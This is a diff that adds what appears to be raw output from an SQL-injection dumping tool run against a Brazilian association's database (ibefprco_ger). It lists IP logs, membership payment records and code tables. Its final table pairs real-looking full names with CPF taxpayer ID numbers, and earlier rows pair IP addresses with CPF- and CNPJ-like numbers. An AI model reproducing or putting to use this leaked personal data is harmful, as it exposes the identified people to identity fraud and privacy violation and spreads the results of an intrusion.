+| 177.79.72.237   | NULL        | NULL           | 2018-09-20 13:24:55 | 1        | 9959      | 1          |
+| 177.92.32.61    | NULL        | NULL           | 2018-09-20 14:23:09 | 3        | 10038     | 1          |
+| 177.92.39.66    | NULL        | NULL           | 2018-09-24 18:06:39 | 2        | 10045     | 1          |
+| 177.92.49.242   | 45704589987 | 04689885000139 | 2018-09-21 11:48:31 | 1        | 0         | 1          |
+| 177.92.51.198   | NULL        | NULL           | 2018-09-26 17:37:31 | 2        | 10009     | 1          |
+| 177.96.103.43   | NULL        | NULL           | 2018-09-20 21:33:10 | 1        | 10036     | 1          |
+| 177.96.15.231   | 07926705900 | 81667842000101 | 2018-09-21 20:12:57 | 2        | 0         | 1          |
+| 177.97.175.241  | NULL        | NULL           | 2018-09-27 12:16:39 | 2        | 803       | 1          |
+| 179.154.55.14   | NULL        | NULL           | 2018-09-26 13:56:22 | 1        | 9963      | 1          |
+| 179.184.2.237   | NULL        | NULL           | 2018-09-20 20:38:02 | 1        | 9992      | 1          |
+| 179.191.85.86   | 04104611999 | 49928567000707 | 2018-09-20 15:24:10 | 3        | 0         | 1          |
+| 179.203.175.150 | 56008775953 | 56008775953    | 2018-09-20 17:18:10 | 2        | 0         | 1          |
+| 179.211.15.220  | NULL        | NULL           | 2018-09-27 10:16:51 | 1        | 369       | 1          |
+| 179.219.212.155 | 11111111111 | 11111111111111 | 2018-09-26 09:55:51 | 2        | 0         | 1          |
+| 179.220.36.107  | 01482143984 | 09108710000104 | 2018-09-25 10:28:51 | 1        | 0         | 1          |
+| 179.241.140.188 | NULL        | NULL           | 2018-09-26 11:45:10 | 1        | 10014     | 1          |
+| 179.91.157.213  | 81212046900 | 14387308000227 | 2018-09-27 14:00:52 | 3        | 0         | 1          |
+| 181.223.90.66   | 33622833068 | 28309795000133 | 2018-09-20 18:00:26 | 3        | 0         | 1          |
+| 186.215.180.203 | NULL        | NULL           | 2018-09-21 10:27:37 | 1        | 501       | 1          |
+| 186.230.12.130  | NULL        | NULL           | 2018-09-21 14:31:26 | 3        | 771       | 1          |
+| 186.230.12.130  | 16956505819 | 75609123000123 | 2018-09-21 14:26:44 | 3        | 0         | 1          |
+| 186.230.12.130  | 02420866754 | 75609123000123 | 2018-09-21 16:03:31 | 3        | 0         | 1          |
+| 187.255.243.65  | 85098949904 | 28550396000160 | 2018-09-25 10:45:18 | 3        | 0         | 1          |
+| 187.32.178.33   | NULL        | NULL           | 2018-09-24 11:03:20 | 2        | 9877      | 1          |
+| 187.32.178.33   | NULL        | NULL           | 2018-09-24 10:52:47 | 2        | 879       | 1          |
++-----------------+-------------+----------------+---------------------+----------+-----------+------------+
+
+Database: ibefprco_ger
+Table: t_socios
+[50 entries]
++---------+
+| soc_cod |
++---------+
+| 1       |
+| 2       |
+| 4       |
+| 5       |
+| 6       |
+| 9       |
+| 10      |
+| 13      |
+| 17      |
+| 20      |
+| 24      |
+| 25      |
+| 34      |
+| 35      |
+| 36      |
+| 39      |
+| 51      |
+| 59      |
+| 66      |
+| 70      |
+| 73      |
+| 93      |
+| 112     |
+| 125     |
+| 130     |
+| 162     |
+| 165     |
+| 168     |
+| 203     |
+| 204     |
+| 209     |
+| 210     |
+| 211     |
+| 212     |
+| 213     |
+| 221     |
+| 222     |
+| 228     |
+| 232     |
+| 239     |
+| 240     |
+| 241     |
+| 254     |
+| 256     |
+| 261     |
+| 274     |
+| 279     |
+| 286     |
+| 300     |
+| 306     |
++---------+
+
+Database: ibefprco_ger
+Table: t_socios_atuacao
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 2487 | 7      | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_contacorrente
+[50 entries]
++--------------+-------+---------+----------+-----------+-----------+------------+------------+-------------+--------------+---------------------+
+| conta_pedido | ativo | soc_cod | user_cod | conta_obs | conta_cod | conta_tipo | conta_venc | conta_valor | conta_status | conta_dt_baixa      |
++--------------+-------+---------+----------+-----------+-----------+------------+------------+-------------+--------------+---------------------+
+| NULL         | s     | 1       | 0        | NULL      | 0000002   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 9       | 0        | NULL      | 0000071   | s          | 2002-05-29 | 62,00       | PG           | 2000-07-30 00:00:00 |
+| NULL         | s     | 9       | 0        | NULL      | 0000075   | s          | 2002-11-30 | 62,00       | PG           | 2002-12-02 00:00:00 |
+| NULL         | s     | 20      | 0        | NULL      | 0000197   | s          | 2001-07-30 | 62,00       | PG           | 2001-07-30 00:00:00 |
+| NULL         | s     | 20      | 0        | NULL      | 0000198   | s          | 2001-09-27 | 62,00       | PG           | 2001-09-27 00:00:00 |
+| NULL         | s     | 59      | 0        | NULL      | 0000307   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-27 00:00:00 |
+| NULL         | s     | 130     | 0        | NULL      | 0000471   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 168     | 0        | NULL      | 0000511   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-28 00:00:00 |
+| NULL         | s     | 228     | 0        | NULL      | 0000731   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-28 00:00:00 |
+| NULL         | s     | 239     | 0        | NULL      | 0000771   | s          | 2001-07-30 | 62,00       | PG           | 2002-04-26 00:00:00 |
+| NULL         | s     | 239     | 0        | NULL      | 0000772   | s          | 2001-10-30 | 62,00       | PG           | 2002-04-26 00:00:00 |
+| NULL         | s     | 239     | 0        | NULL      | 0000773   | s          | 2002-01-30 | 62,00       | PG           | 2002-04-26 00:00:00 |
+| NULL         | s     | 239     | 0        | NULL      | 0000775   | s          | 2002-07-30 | 62,00       | PG           | 2002-06-28 00:00:00 |
+| NULL         | s     | 240     | 0        | NULL      | 0000815   | s          | 2013-03-03 | 600,00      | PG           | 2013-05-03 00:00:00 |
+| NULL         | s     | 241     | 0        | NULL      | 0000816   | s          | 2013-05-03 | 600,00      | PG           | 2013-05-03 00:00:00 |
+| NULL         | s     | 73      | 0        | NULL      | 0004319   | s          | 2013-07-31 |  210,00     | PG           | 2013-07-31 00:00:00 |
+| NULL         | s     | 274     | 0        | NULL      | 0000878   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-03 00:00:00 |
+| NULL         | s     | 424     | 0        | NULL      | 0001148   | s          | 2001-12-06 | 62,00       | PG           | 2002-03-26 00:00:00 |
+| NULL         | s     | 424     | 0        | NULL      | 0001150   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 433     | 0        | NULL      | 0001230   | s          | 2013-05-03 | 600,00      | PG           | 2013-05-03 00:00:00 |
+| NULL         | s     | 467     | 0        | NULL      | 0001296   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-03 00:00:00 |
+| NULL         | s     | 501     | 0        | NULL      | 0001368   | s          | 2002-10-30 | 62,00       | PG           | 2002-10-30 00:00:00 |
+| NULL         | s     | 505     | 0        | NULL      | 0001411   | s          | 2002-01-30 | 62,00       | PG           | 2002-04-22 00:00:00 |
+| NULL         | s     | 511     | 0        | NULL      | 0001490   | s          | 0000-00-00 | 0,00        | PG           | 2001-01-01 00:00:00 |
+| NULL         | s     | 511     | 0        | NULL      | 0001491   | s          | 2001-08-30 | 62,00       | PG           | 2001-08-30 00:00:00 |
+| NULL         | s     | 511     | 0        | NULL      | 0001492   | s          | 2001-12-06 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 511     | 0        | NULL      | 0001494   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 530     | 0        | NULL      | 0001812   | s          | 2012-10-01 | 360,00      | PG           | 2012-10-15 00:00:00 |
+| NULL         | s     | 557     | 0        | NULL      | 0001920   | s          | 2002-01-30 | 62,00       | PG           | 2002-04-27 00:00:00 |
+| NULL         | s     | 557     | 0        | NULL      | 0001921   | s          | 2001-10-30 | 62,00       | PG           | 2002-07-24 00:00:00 |
+| NULL         | s     | 560     | 0        | NULL      | 0001956   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 562     | 0        | NULL      | 0001979   | s          | 2001-12-06 | 62,00       | PG           | 2001-12-06 00:00:00 |
+| NULL         | s     | 562     | 0        | NULL      | 0001981   | s          | 2002-05-29 | 62,00       | PG           | 2002-07-12 00:00:00 |
+| NULL         | s     | 594     | 0        | NULL      | 0002124   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-27 00:00:00 |
+| NULL         | s     | 627     | 0        | NULL      | 0002159   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-28 00:00:00 |
+| NULL         | s     | 655     | 0        | NULL      | 0002222   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-10 00:00:00 |
+| NULL         | s     | 692     | 0        | NULL      | 0002336   | s          | 2001-12-06 | 62,00       | PG           | 2002-02-25 00:00:00 |
+| NULL         | s     | 692     | 0        | NULL      | 0002338   | s          | 2002-03-02 | 62,00       | PG           | 2002-04-03 00:00:00 |
+| NULL         | s     | 692     | 0        | NULL      | 0002340   | s          | 2002-05-29 | 62,00       | PG           | 2002-06-07 00:00:00 |
+| NULL         | s     | 775     | 0        | NULL      | 0002606   | s          | 2002-01-30 | 62,00       | PG           | 2002-02-21 00:00:00 |
+| NULL         | s     | 787     | 0        | NULL      | 0002652   | s          | 2001-10-30 | 62,00       | PG           | 2001-10-31 00:00:00 |
+| NULL         | s     | 803     | 0        | NULL      | 0002746   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 814     | 0        | NULL      | 0002796   | s          | 2002-10-30 | 62,00       | PG           | 2002-11-06 00:00:00 |
+| NULL         | s     | 822     | 0        | NULL      | 0002840   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 843     | 0        | NULL      | 0003041   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 845     | 0        | NULL      | 0003085   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-27 00:00:00 |
+| NULL         | s     | 849     | 0        | NULL      | 0003125   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
+| NULL         | s     | 857     | 0        | NULL      | 0003263   | s          | 2009-06-30 | 96,80       | PG           | 2009-06-03 00:00:00 |
+| NULL         | s     | 864     | 0        | NULL      | 0003274   | s          | 2002-01-30 | 62,00       | PG           | 2002-07-30 00:00:00 |
+| NULL         | s     | 872     | 0        | NULL      | 0003365   | s          | 2002-05-29 | 62,00       | PG           | 2002-05-29 00:00:00 |
++--------------+-------+---------+----------+-----------+-----------+------------+------------+-------------+--------------+---------------------+
+
+Database: ibefprco_ger
+Table: t_socios_empresa
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 2522 | 9      | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_especialista
+[50 entries]
++-----+--------+---------+----------+
+| cod | codigo | soc_cod | user_cod |
++-----+--------+---------+----------+
+| 5   | 2      | 2       | 0        |
+| 6   | 5      | 2       | 0        |
+| 7   | 7      | 2       | 0        |
+| 8   | 9      | 2       | 0        |
+| 9   | 5      | 3       | 0        |
+| 10  | 6      | 3       | 0        |
+| 11  | 7      | 3       | 0        |
+| 12  | 8      | 3       | 0        |
+| 25  | 2      | 7       | 0        |
+| 26  | 5      | 7       | 0        |
+| 27  | 2      | 8       | 0        |
+| 31  | 5      | 10      | 0        |
+| 34  | 2      | 17      | 0        |
+| 35  | 3      | 21      | 0        |
+| 36  | 5      | 21      | 0        |
+| 37  | 7      | 21      | 0        |
+| 38  | 8      | 21      | 0        |
+| 41  | 2      | 35      | 0        |
+| 43  | 2      | 39      | 0        |
+| 44  | 5      | 39      | 0        |
+| 45  | 1      | 51      | 0        |
+| 46  | 8      | 51      | 0        |
+| 47  | 2      | 52      | 0        |
+| 48  | 5      | 52      | 0        |
+| 49  | 1      | 56      | 0        |
+| 50  | 2      | 56      | 0        |
+| 51  | 5      | 56      | 0        |
+| 52  | 7      | 56      | 0        |
+| 53  | 2      | 59      | 0        |
+| 54  | 5      | 59      | 0        |
+| 55  | 2      | 66      | 0        |
+| 58  | 8      | 90      | 0        |
+| 59  | 9      | 90      | 0        |
+| 60  | 5      | 92      | 0        |
+| 66  | 2      | 95      | 0        |
+| 67  | 2      | 101     | 0        |
+| 68  | 2      | 104     | 0        |
+| 69  | 5      | 104     | 0        |
+| 70  | 7      | 104     | 0        |
+| 71  | 2      | 125     | 0        |
+| 72  | 5      | 125     | 0        |
+| 73  | 2      | 143     | 0        |
+| 74  | 2      | 151     | 0        |
+| 75  | 5      | 151     | 0        |
+| 76  | 2      | 153     | 0        |
+| 77  | 1      | 155     | 0        |
+| 78  | 2      | 155     | 0        |
+| 79  | 5      | 155     | 0        |
+| 80  | 6      | 155     | 0        |
+| 81  | 7      | 155     | 0        |
++-----+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_esporte
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 2750 | 13     | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_evento_gostaria
+[50 entries]
++-----+--------+---------+----------+
+| cod | codigo | soc_cod | user_cod |
++-----+--------+---------+----------+
+| 1   | 1      | 2       | 0        |
+| 2   | 3      | 2       | 0        |
+| 7   | 1      | 7       | 0        |
+| 8   | 2      | 7       | 0        |
+| 9   | 3      | 7       | 0        |
+| 10  | 2      | 8       | 0        |
+| 11  | 3      | 8       | 0        |
+| 16  | 1      | 17      | 0        |
+| 17  | 1      | 21      | 0        |
+| 18  | 3      | 21      | 0        |
+| 22  | 1      | 35      | 0        |
+| 24  | 1      | 39      | 0        |
+| 25  | 3      | 39      | 0        |
+| 26  | 1      | 51      | 0        |
+| 27  | 1      | 52      | 0        |
+| 28  | 3      | 52      | 0        |
+| 29  | 1      | 56      | 0        |
+| 30  | 3      | 56      | 0        |
+| 31  | 3      | 59      | 0        |
+| 32  | 3      | 66      | 0        |
+| 37  | 1      | 90      | 0        |
+| 38  | 3      | 90      | 0        |
+| 40  | 1      | 95      | 0        |
+| 41  | 3      | 95      | 0        |
+| 42  | 3      | 101     | 0        |
+| 43  | 1      | 104     | 0        |
+| 44  | 3      | 104     | 0        |
+| 47  | 1      | 147     | 0        |
+| 48  | 3      | 147     | 0        |
+| 49  | 3      | 149     | 0        |
+| 50  | 3      | 151     | 0        |
+| 51  | 1      | 153     | 0        |
+| 52  | 2      | 153     | 0        |
+| 53  | 3      | 153     | 0        |
+| 54  | 2      | 156     | 0        |
+| 55  | 3      | 156     | 0        |
+| 56  | 1      | 157     | 0        |
+| 57  | 3      | 158     | 0        |
+| 58  | 3      | 159     | 0        |
+| 59  | 1      | 160     | 0        |
+| 60  | 1      | 161     | 0        |
+| 61  | 3      | 161     | 0        |
+| 62  | 2      | 163     | 0        |
+| 63  | 2      | 164     | 0        |
+| 64  | 1      | 166     | 0        |
+| 65  | 2      | 166     | 0        |
+| 66  | 3      | 166     | 0        |
+| 67  | 3      | 167     | 0        |
+| 70  | 3      | 169     | 0        |
+| 71  | 1      | 171     | 0        |
++-----+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_eventos
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 2611 | 2      | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_filhos
+[50 entries]
++-----------+
+| filho_cod |
++-----------+
+| 3         |
+| 4         |
+| 16        |
+| 17        |
+| 20        |
+| 21        |
+| 22        |
+| 23        |
+| 24        |
+| 25        |
+| 26        |
+| 27        |
+| 28        |
+| 29        |
+| 30        |
+| 33        |
+| 34        |
+| 35        |
+| 38        |
+| 39        |
+| 40        |
+| 41        |
+| 42        |
+| 43        |
+| 44        |
+| 45        |
+| 46        |
+| 47        |
+| 48        |
+| 49        |
+| 50        |
+| 51        |
+| 52        |
+| 53        |
+| 54        |
+| 55        |
+| 62        |
+| 63        |
+| 64        |
+| 65        |
+| 66        |
+| 68        |
+| 69        |
+| 70        |
+| 74        |
+| 75        |
+| 76        |
+| 77        |
+| 81        |
+| 82        |
++-----------+
+
+Database: ibefprco_ger
+Table: t_socios_graduado
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 1570 | 2      | 5       | 9        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_idioma
+[50 entries]
++-----+
+| cod |
++-----+
+| 1   |
+| 2   |
+| 4   |
+| 6   |
+| 7   |
+| 10  |
+| 13  |
+| 14  |
+| 15  |
+| 17  |
+| 18  |
+| 19  |
+| 20  |
+| 21  |
+| 22  |
+| 25  |
+| 26  |
+| 27  |
+| 28  |
+| 30  |
+| 31  |
+| 32  |
+| 33  |
+| 34  |
+| 35  |
+| 36  |
+| 37  |
+| 38  |
+| 39  |
+| 40  |
+| 41  |
+| 43  |
+| 44  |
+| 45  |
+| 46  |
+| 47  |
+| 48  |
+| 50  |
+| 51  |
+| 52  |
+| 53  |
+| 54  |
+| 55  |
+| 56  |
+| 57  |
+| 58  |
+| 59  |
+| 60  |
+| 63  |
+| 64  |
++-----+
+
+Database: ibefprco_ger
+Table: t_socios_info
+[50 entries]
++-----+
+| cod |
++-----+
+| 5   |
+| 6   |
+| 7   |
+| 8   |
+| 9   |
+| 10  |
+| 11  |
+| 12  |
+| 13  |
+| 14  |
+| 15  |
+| 16  |
+| 27  |
+| 28  |
+| 29  |
+| 30  |
+| 31  |
+| 32  |
+| 33  |
+| 34  |
+| 35  |
+| 40  |
+| 41  |
+| 42  |
+| 43  |
+| 44  |
+| 45  |
+| 52  |
+| 53  |
+| 54  |
+| 55  |
+| 56  |
+| 57  |
+| 58  |
+| 59  |
+| 60  |
+| 61  |
+| 62  |
+| 63  |
+| 64  |
+| 65  |
+| 66  |
+| 67  |
+| 76  |
+| 77  |
+| 78  |
+| 79  |
+| 83  |
+| 84  |
+| 85  |
++-----+
+
+Database: ibefprco_ger
+Table: t_socios_nivel
+[50 entries]
++-----+
+| cod |
++-----+
+| 2   |
+| 4   |
+| 5   |
+| 8   |
+| 9   |
+| 11  |
+| 13  |
+| 14  |
+| 15  |
+| 16  |
+| 18  |
+| 19  |
+| 20  |
+| 21  |
+| 22  |
+| 24  |
+| 25  |
+| 26  |
+| 27  |
+| 28  |
+| 29  |
+| 30  |
+| 31  |
+| 32  |
+| 33  |
+| 34  |
+| 35  |
+| 36  |
+| 37  |
+| 38  |
+| 39  |
+| 41  |
+| 42  |
+| 43  |
+| 44  |
+| 45  |
+| 46  |
+| 47  |
+| 48  |
+| 49  |
+| 50  |
+| 51  |
+| 52  |
+| 53  |
+| 54  |
+| 55  |
+| 56  |
+| 57  |
+| 58  |
+| 59  |
++-----+
+
+Database: ibefprco_ger
+Table: t_socios_passatempo
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 4902 | 13     | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_quest
+[50 entries]
++-----+
+| cod |
++-----+
+| 2   |
+| 6   |
+| 7   |
+| 9   |
+| 10  |
+| 11  |
+| 12  |
+| 17  |
+| 18  |
+| 19  |
+| 21  |
+| 22  |
+| 28  |
+| 33  |
+| 37  |
+| 38  |
+| 58  |
+| 59  |
+| 61  |
+| 71  |
+| 73  |
+| 74  |
+| 76  |
+| 77  |
+| 85  |
+| 88  |
+| 93  |
+| 94  |
+| 97  |
+| 98  |
+| 99  |
+| 108 |
+| 109 |
+| 112 |
+| 114 |
+| 115 |
+| 129 |
+| 132 |
+| 135 |
+| 137 |
+| 143 |
+| 146 |
+| 149 |
+| 151 |
+| 153 |
+| 154 |
+| 158 |
+| 161 |
+| 162 |
+| 171 |
++-----+
+
+Database: ibefprco_ger
+Table: t_socios_remuneracao
+[50 entries]
++-----+--------+---------+----------+
+| cod | codigo | soc_cod | user_cod |
++-----+--------+---------+----------+
+| 2   | 4      | 2       | 0        |
+| 6   | 4      | 10      | 0        |
+| 8   | 4      | 17      | 0        |
+| 9   | 4      | 20      | 0        |
+| 12  | 4      | 35      | 0        |
+| 14  | 4      | 39      | 0        |
+| 15  | 4      | 51      | 0        |
+| 16  | 2      | 59      | 0        |
+| 17  | 4      | 66      | 0        |
+| 21  | 3      | 125     | 0        |
+| 23  | 2      | 162     | 0        |
+| 24  | 4      | 165     | 0        |
+| 26  | 4      | 203     | 0        |
+| 27  | 1      | 204     | 0        |
+| 33  | 4      | 222     | 0        |
+| 39  | 4      | 274     | 0        |
+| 44  | 2      | 400     | 0        |
+| 47  | 4      | 405     | 0        |
+| 49  | 3      | 407     | 0        |
+| 73  | 4      | 481     | 0        |
+| 74  | 2      | 482     | 0        |
+| 76  | 4      | 489     | 0        |
+| 87  | 4      | 524     | 0        |
+| 89  | 4      | 526     | 0        |
+| 91  | 4      | 529     | 0        |
+| 93  | 4      | 532     | 0        |
+| 94  | 3      | 533     | 0        |
+| 95  | 1      | 534     | 0        |
+| 105 | 4      | 564     | 0        |
+| 106 | 3      | 569     | 0        |
+| 107 | 4      | 574     | 0        |
+| 108 | 3      | 585     | 0        |
+| 111 | 4      | 623     | 0        |
+| 113 | 4      | 631     | 0        |
+| 118 | 4      | 656     | 0        |
+| 119 | 2      | 657     | 0        |
+| 123 | 2      | 692     | 0        |
+| 124 | 3      | 700     | 0        |
+| 129 | 2      | 754     | 0        |
+| 130 | 4      | 769     | 0        |
+| 132 | 3      | 772     | 0        |
+| 141 | 4      | 821     | 0        |
+| 142 | 4      | 831     | 0        |
+| 145 | 2      | 836     | 0        |
+| 148 | 4      | 841     | 0        |
+| 151 | 4      | 846     | 0        |
+| 154 | 4      | 855     | 0        |
+| 171 | 2      | 893     | 0        |
+| 174 | 4      | 902     | 0        |
+| 177 | 1      | 909     | 0        |
++-----+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_trabalhos
+[1 entry]
++------+--------+---------+----------+
+| cod  | codigo | soc_cod | user_cod |
++------+--------+---------+----------+
+| 1255 | 4      | 1       | 5        |
++------+--------+---------+----------+
+
+Database: ibefprco_ger
+Table: t_socios_votacao
+[50 entries]
++--------+------------+--------+--------+---------+----------------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------+----------+----------+----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+------------------+---------------------+
+| soc_id | soc_cidade | soc_rg | soc_uf | soc_end | soc_cpf        | soc_num | soc_cel | soc_com | soc_cep | soc_cod | soc_sexo | soc_pgto | soc_nome                                   | user_cod | soc_comp | soc_fone | soc_ativo | soc_email | soc_cargo | soc_nome2 | soc_civil | soc_senha | soc_c_trab | soc_c_prof | soc_bairro | soc_avisar | soc_natural | soc_dt_nasc | soc_p_email | soc_p_fone3 | soc_conjuge | soc_empresa | soc_cobranca | soc_registro | soc_nacional | soc_cx_postal | soc_c_dt_nasc | soc_secretaria | soc_dt_filiacao | soc_fone_avisar | soc_enviar_email | soc_correspondencia |
++--------+------------+--------+--------+---------+----------------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------+----------+----------+----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+------------------+---------------------+
+| NULL   | NULL       | NULL   | NULL   | NULL    | 873.207.209-06 | NULL    | NULL    | NULL    | NULL    | 78      | NULL     | NULL     | ANTONIO CARVALHO MORAIS JUNIOR             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 373.544.009-63 | NULL    | NULL    | NULL    | NULL    | 98      | NULL     | NULL     | JOMARA APARECIDA DE MACEDO BALHS           | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 093.560.539-87 | NULL    | NULL    | NULL    | NULL    | 99      | NULL     | NULL     | DILMA BERTOLINA CORREA BRANDT              | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 000.202.406-78 | NULL    | NULL    | NULL    | NULL    | 100     | NULL     | NULL     | PAULO FRANCISCO SILVA                      | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 463.105.179-53 | NULL    | NULL    | NULL    | NULL    | 101     | NULL     | NULL     | HENRIQUE LENZ CESAR FILHO                  | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 307.581.309-53 | NULL    | NULL    | NULL    | NULL    | 102     | NULL     | NULL     | ELMO MACEDO BRUGNOLO                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 536.091.159-04 | NULL    | NULL    | NULL    | NULL    | 103     | NULL     | NULL     | EDUARDO BUSCHLE                            | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 736.380.800-72 | NULL    | NULL    | NULL    | NULL    | 104     | NULL     | NULL     | OTÁVIO RAMOS PEREIRA                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 071.660.959-20 | NULL    | NULL    | NULL    | NULL    | 105     | NULL     | NULL     | NEI SENTER MARTINS                         | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 184.345.509-97 | NULL    | NULL    | NULL    | NULL    | 106     | NULL     | NULL     | MIRALCY DE FATIMA VOSS                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 572.172.469-20 | NULL    | NULL    | NULL    | NULL    | 107     | NULL     | NULL     | NEREU MIGUEL RIBEIRO DOMINGUES             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 025.995.889-10 | NULL    | NULL    | NULL    | NULL    | 108     | NULL     | NULL     | JULIO MAGNO DUARTE HARADA                  | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
